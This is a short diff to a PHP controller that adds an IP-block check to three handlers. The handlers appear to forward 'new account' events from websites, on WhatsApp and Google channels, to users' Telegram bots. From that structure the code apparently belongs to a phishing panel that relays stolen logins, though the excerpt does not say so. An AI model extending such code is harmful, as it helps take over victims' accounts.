@@ -94,10 +94,14 @@ class RealtimeWeb extends Controller
                 $realtime_bot = new Api(config('telegrambot.realtime'));
                 $user = User::find($web_info->userid);
                 if ($user) {
+                    // kiểm tra xem ip có bị chặn không
+                    if (check_blocked_ip($user->id, $ip)) {
+                        // destroy session
+                        return;
+                    }
                     $user_telegram_id = Json::decode($user->data)->telegram_id;
                     if ($user_telegram_id) {
                         $website = Website::where('userid', $user->id)->where('id', $web_info->webid)->first();
-                        $ip = getRealIp();
                         // new account
                         if ($website) {
                             $website = Json::decode($website->data);
@@ -198,8 +202,12 @@ class RealtimeWeb extends Controller
                 $whatsapp_realtime_bot = new Api(config('telegrambot.whatsapp'));
                 $user = User::find($web_info->userid);
                 if ($user) {
+                    // kiểm tra xem ip có bị chặn không
+                    if (check_blocked_ip($user->id, $ip)) {
+                        // destroy session
+                        return;
+                    }
                     $user_telegram_id = Json::decode($user->data)->telegram_id;
-                    $ip = getRealIp();
                     if ($user_telegram_id) {
                         $website = Website::where('userid', $user->id)->where('id', $web_info->webid)->first();
                         // new account
@@ -297,6 +305,11 @@ class RealtimeWeb extends Controller
                 $google_realtime_bot = new Api(config('telegrambot.google'));
                 $user = User::find($web_info->userid);
                 if ($user) {
+                    // kiểm tra xem ip có bị chặn không
+                    if (check_blocked_ip($user->id, $ip)) {
+                        // destroy session
+                        return;
+                    }
                     $user_telegram_id = Json::decode($user->data)->telegram_id;
                     if ($user_telegram_id) {
                         $website = Website::where('userid', $user->id)->where('id', $web_info->webid)->first();
